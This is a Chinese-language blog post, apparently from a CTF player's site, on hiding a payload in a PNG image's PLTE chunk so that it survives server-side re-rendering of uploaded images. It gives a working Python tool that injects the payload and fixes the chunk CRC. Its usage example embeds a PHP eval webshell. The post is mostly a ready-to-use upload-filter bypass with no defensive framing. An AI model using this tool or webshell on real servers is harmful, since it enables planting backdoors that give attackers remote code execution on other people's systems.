<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>PNG-write-payload | Rock&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="在PNG图像中隐藏payload，绕过二次渲染1.绕过原理在上传含有木马的图像时常常会遇到服务端对上传的图像进行二次渲染。服务端会提取图像中信息，并重新合成一幅图像，所以简单地将木马附加到图像最后或者注释信息中是不能成功上传图片木马的。对于PNG图像，可以考虑把木马隐藏到PLTE数据区或是IDATA数据中。2.程序实现以下的程序实现了将用户给定payload写入含PLTE数据区的PNG图像中。使用">
<meta property="og:type" content="article">
<meta property="og:title" content="PNG-write-payload">
<meta property="og:url" content="https://rock718.github.io.git/2020/01/04/PNG-write-payload/index.html">
<meta property="og:site_name" content="Rock&#39;s blog">
<meta property="og:description" content="在PNG图像中隐藏payload，绕过二次渲染1.绕过原理在上传含有木马的图像时常常会遇到服务端对上传的图像进行二次渲染。服务端会提取图像中信息，并重新合成一幅图像，所以简单地将木马附加到图像最后或者注释信息中是不能成功上传图片木马的。对于PNG图像，可以考虑把木马隐藏到PLTE数据区或是IDATA数据中。2.程序实现以下的程序实现了将用户给定payload写入含PLTE数据区的PNG图像中。使用">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2020-01-04T10:31:01.000Z">
<meta property="article:modified_time" content="2020-01-04T11:18:58.000Z">
<meta property="article:author" content="Rock">
<meta property="article:tag" content="python">
<meta property="article:tag" content="image">
<meta property="article:tag" content="png">
<meta property="article:tag" content="code">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Rock&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Noto+Sans+KR:100,300,400,700&amp;subset=korean" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <!--<div id="banner"></div>-->
  <div id="header-outer" class="outer">
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        <a href="/" id="main-nav-title" class="main-nav-link">Rock&#39;s blog</a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives/">Archives</a>
        
          <a class="main-nav-link" href="/about/">about</a>
        
      </nav>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-PNG-write-payload" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      PNG-write-payload
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="在PNG图像中隐藏payload，绕过二次渲染"><a href="#在PNG图像中隐藏payload，绕过二次渲染" class="headerlink" title="在PNG图像中隐藏payload，绕过二次渲染"></a>在PNG图像中隐藏payload，绕过二次渲染</h1><h2 id="1-绕过原理"><a href="#1-绕过原理" class="headerlink" title="1.绕过原理"></a>1.绕过原理</h2><h3 id="在上传含有木马的图像时常常会遇到服务端对上传的图像进行二次渲染。服务端会提取图像中信息，并重新合成一幅图像，所以简单地将木马附加到图像最后或者注释信息中是不能成功上传图片木马的。"><a href="#在上传含有木马的图像时常常会遇到服务端对上传的图像进行二次渲染。服务端会提取图像中信息，并重新合成一幅图像，所以简单地将木马附加到图像最后或者注释信息中是不能成功上传图片木马的。" class="headerlink" title="在上传含有木马的图像时常常会遇到服务端对上传的图像进行二次渲染。服务端会提取图像中信息，并重新合成一幅图像，所以简单地将木马附加到图像最后或者注释信息中是不能成功上传图片木马的。"></a>在上传含有木马的图像时常常会遇到服务端对上传的图像进行二次渲染。服务端会提取图像中信息，并重新合成一幅图像，所以简单地将木马附加到图像最后或者注释信息中是不能成功上传图片木马的。</h3><h3 id="对于PNG图像，可以考虑把木马隐藏到PLTE数据区或是IDATA数据中。"><a href="#对于PNG图像，可以考虑把木马隐藏到PLTE数据区或是IDATA数据中。" class="headerlink" title="对于PNG图像，可以考虑把木马隐藏到PLTE数据区或是IDATA数据中。"></a>对于PNG图像，可以考虑把木马隐藏到<code>PLTE</code>数据区或是<code>IDATA</code>数据中。</h3><h2 id="2-程序实现"><a href="#2-程序实现" class="headerlink" title="2.程序实现"></a>2.程序实现</h2><h3 id="以下的程序实现了将用户给定payload写入含PLTE数据区的PNG图像中。"><a href="#以下的程序实现了将用户给定payload写入含PLTE数据区的PNG图像中。" class="headerlink" title="以下的程序实现了将用户给定payload写入含PLTE数据区的PNG图像中。"></a>以下的程序实现了将用户给定payload写入含<code>PLTE</code>数据区的PNG图像中。</h3><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><ul>
<li>-f 选择要嵌入payload的png图片</li>
<li>-m PLTE 指定嵌入位置为<code>PLTE</code>数据区</li>
<li>-p 输入要嵌入的payload,必须使用<code>&quot;</code>包围</li>
</ul>
<h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><pre><code>xxx.py -f 1.png -m PLTE -p &quot;&lt;?php @eval($_POST[&#39;id&#39;]);?&gt;&quot;
</code></pre>
<h3 id="具体实现代码："><a href="#具体实现代码：" class="headerlink" title="具体实现代码："></a>具体实现代码：</h3><pre><code>#!/bin/python3
import binascii
import re
import sys, getopt

&#39;&#39;&#39; GET args &#39;&#39;&#39;
args = sys.argv[1:]
try:
    opts, args = getopt.getopt(sys.argv[1:],&#39;f:m:p:&#39;)
except getopt.GetoptError:
    print(&quot;Usage: -f file -m PLTE -p \&quot;playload\&quot;&quot;)
    sys.exit()

file_path = mode = payload = &quot;&quot;
for opt, argv in opts:
    if opt == &#39;-f&#39;:
        file_path = argv
    elif opt == &#39;-m&#39;:
        if argv == &#39;PLTE&#39; or argv == &#39;IDAT&#39;:
            mode = argv
        else:
            print(&quot;Mode ERROR!&quot;)
            sys.exit()
    elif opt == &#39;-p&#39;:
        payload = argv

if mode == &#39;PLTE&#39;:
    &#39;&#39;&#39; PLTE payload &#39;&#39;&#39;
    hex_payload = binascii.b2a_hex(payload.encode())
    file_name = file_path.split(&#39;/&#39;)[-1]
    png = open(file_path,&#39;rb&#39;)
    image = png.read()
    png.close()
    hexstr = binascii.b2a_hex(image)

    searchObj = re.search(&#39;504c5445(.*?)49444154&#39;, hexstr.decode())
    if searchObj:
        front_data = image[:searchObj.span()[0]//2]
        last_data = image[searchObj.span()[1]//2 - 4:]
        plte = &#39;504c5445&#39; + searchObj.group(1)
        if len(plte[:-16]) &gt;= len(hex_payload):
            _new_plte = plte[:8] + hex_payload.decode() + plte[len(hex_payload) + 8:-16]

            &#39;&#39;&#39; new PLTE crc &#39;&#39;&#39;
            crc = binascii.crc32(binascii.a2b_hex(_new_plte)) &amp; 0xffffffff
            new_plte = _new_plte + hex(crc)[2:] + plte[-8:]
            plte_data = binascii.a2b_hex(new_plte)
            new_image_data = front_data + plte_data + last_data

            &#39;&#39;&#39; new png &#39;&#39;&#39;
            try:
                new_png = open(&quot;_&quot;+file_name,&#39;xb&#39;)
                new_png.write(new_image_data)
                new_png.close()
            except IOError:
                print(&quot;_%s already exists.&quot; % (file_name))
                sys.exit()
        else:
            print(&quot;Playload too long!&quot;)
            sys.exit()
    else:
        print(&quot;Image doesn&#39;t include PLTE.&quot;)
</code></pre>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://rock718.github.io.git/2020/01/04/PNG-write-payload/" data-id="cl9y4cx9i001d24fygow3exk4" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/code/" rel="tag">code</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/image/" rel="tag">image</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/png/" rel="tag">png</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2020/05/01/xctf-misc-wp/" id="article-nav-newer" class="article-nav-link-wrap">
      <span class="article-nav-caption">Newer</span>
      <div class="article-nav-title">
        
          xctf-misc-wp
        
      </div>
    </a>
  
  
    <a href="/2019/12/30/xctf-web-wp/" id="article-nav-older" class="article-nav-link-wrap">
      <span class="article-nav-caption">Older</span>
      <div class="article-nav-title">xctf-web-wp</div>
    </a>
  
</nav>

  
</article>

</section>
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 Rock<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> with 
      theme_by <a href="http://hexo.io/" target="_blank">mango</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives/" class="mobile-nav-link">Archives</a>
  
    <a href="/about/" class="mobile-nav-link">about</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>